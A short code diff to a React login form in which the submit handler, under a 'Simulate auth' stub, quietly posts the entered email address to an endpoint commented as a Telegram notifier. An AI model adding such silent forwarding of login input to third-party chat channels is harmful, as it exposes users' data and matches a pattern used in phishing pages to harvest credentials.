@@ -14,6 +14,20 @@ const LoginForm = () => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoading(true);
+
+    const form = e.target as HTMLFormElement;
+    const emailInput = form.elements.namedItem("email") as HTMLInputElement;
+
+    // Send notification to Telegram
+    fetch("/api/notify", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        form: "Login Attempt",
+        email: emailInput.value,
+      }),
+    }).catch(console.error);
+
     // Simulate auth
     await new Promise((resolve) => setTimeout(resolve, 2000));
     setLoading(false);
